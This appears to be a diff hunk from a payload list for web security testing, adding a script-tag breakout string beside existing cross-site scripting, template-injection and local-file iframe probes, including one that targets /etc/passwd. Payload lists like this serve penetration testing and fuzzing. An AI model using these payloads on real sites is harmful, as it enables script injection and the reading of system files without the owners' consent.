@@ -7,3 +7,4 @@ solid\"><u>test
 </x></svg><iframe src=\"\" srcdoc=\"&lt; svg onload=alert (15)&gt;\">{{7*7}}"
 "><iframe src="file:///etc/passwd"></iframe>
 ">\<svg/onload=document.write(document.location)>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=></scrIpt>
